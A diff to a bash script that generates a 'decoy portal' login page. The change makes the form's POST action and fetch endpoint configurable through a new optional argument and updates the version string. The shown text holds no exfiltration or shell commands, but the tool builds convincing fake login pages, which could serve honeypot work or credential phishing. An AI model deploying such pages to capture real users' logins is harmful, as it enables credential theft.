@@ -1,9 +1,10 @@
 #!/bin/bash
 
 TARGET_DIR=$1
+AUTH_PATH=${2:-/api/v1/authenticate}
 
 if [ -z "$TARGET_DIR" ]; then
-    echo "Usage: $0 <target_directory>"
+    echo "Usage: $0 <target_directory> [auth_path]"
     exit 1
 fi
 
@@ -462,7 +463,7 @@ cat > "$TARGET_DIR/index.html" <<EOF
             <span id="$ID_ALERT_TXT"></span>
         </div>
 
-        <form id="$ID_FORM" class="space-y-4" method="POST" action="/api/v1/authenticate">
+        <form id="$ID_FORM" class="space-y-4" method="POST" action="$AUTH_PATH">
             <input type="hidden" name="$CSRF_PARAM" value="$CSRF_VAL">
 
             <div>
@@ -536,7 +537,7 @@ cat > "$TARGET_DIR/index.html" <<EOF
             let errMsg = "$DEFAULT_ERROR";
 
             try {
-                const response = await fetch('/api/v1/authenticate', {
+                const response = await fetch('$AUTH_PATH', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                     body: JSON.stringify(payload)
@@ -585,6 +586,6 @@ echo "✓ Successfully generated decoy portal in $TARGET_DIR"
 echo "  Mode    : $( [ $THEME_MODE -eq 0 ] && echo "Dark" || echo "Light" )"
 echo "  Context : $HEADER ($BADGE)"
 echo "  Action  : $BUTTON_TEXT"
-echo "  Version : gen_page3_105"
+echo "  Version : gen_page_106"
 
 sleep 1
